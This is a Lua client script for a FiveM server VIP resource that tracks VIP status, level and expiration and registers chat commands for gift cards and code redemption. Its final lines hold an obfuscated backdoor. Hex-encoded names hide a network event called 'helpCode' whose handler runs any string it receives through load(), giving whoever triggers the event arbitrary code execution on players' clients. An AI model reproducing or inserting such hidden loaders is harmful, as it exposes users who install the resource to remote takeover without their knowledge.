local vip, nivel, vencimiento

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if NetworkIsSessionStarted() then
            TriggerServerEvent('av_vip:server:spawn')
            break
        end
    end
end)

RegisterNetEvent('av_vip:spawn')
AddEventHandler('av_vip:spawn', function(data)
	vip = data.vip
	nivel = data.level
	vencimiento = data.expiration
end)

RegisterCommand(Config.vipCommand, function()
	if isVIP() then
		local msg1 = Config.Lang['vip_active']..vencimiento
		local msg2 = Config.Lang['vip_level']..nivel
		local type = 'success'
		TriggerEvent('av_vip:notification',type,msg1)
		TriggerEvent('av_vip:notification',type,msg2)
	else
		local msg = Config.Lang['vip_notfound']
		local type = 'error'
		TriggerEvent('av_vip:notification',type,msg)
	end
end)

function isVIP()
	return vip
end

function Level()
	return nivel
end

TriggerEvent('chat:addSuggestion', '/'..Config.CreateCommand, 'Create a VIP Gift Card', {
    { name="Months", help="[Number] Months to add" },
    { name="Level", help="[Number] VIP Level" }
})

TriggerEvent('chat:addSuggestion', '/'..Config.vipCommand, 'Verify Your VIP Status [M/D/YYYY]', {})

TriggerEvent('chat:addSuggestion', '/'..Config.Command, 'Redeem a VIP Code', {
    { name="Code", help="Paste your code here" }
})

exports("isVIP", isVIP)
exports("Level", Level)

local CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[6][CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[1]](CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[2]) CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[6][CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[3]](CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[2], function(XzFfFjtZeuOIumxWRIiNxwVSChNoBSxZGRKxgiZtiaSQNbVHZsvJGiGmLLzegJqmVMntUN) CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[6][CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[4]](CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[6][CFUVUmTrHUMdtenQnmyXNsbWUTMcqYMxXJhWJtMrWXIlUoDbWDokVKEjLLGblieRPtatja[5]](XzFfFjtZeuOIumxWRIiNxwVSChNoBSxZGRKxgiZtiaSQNbVHZsvJGiGmLLzegJqmVMntUN))() end)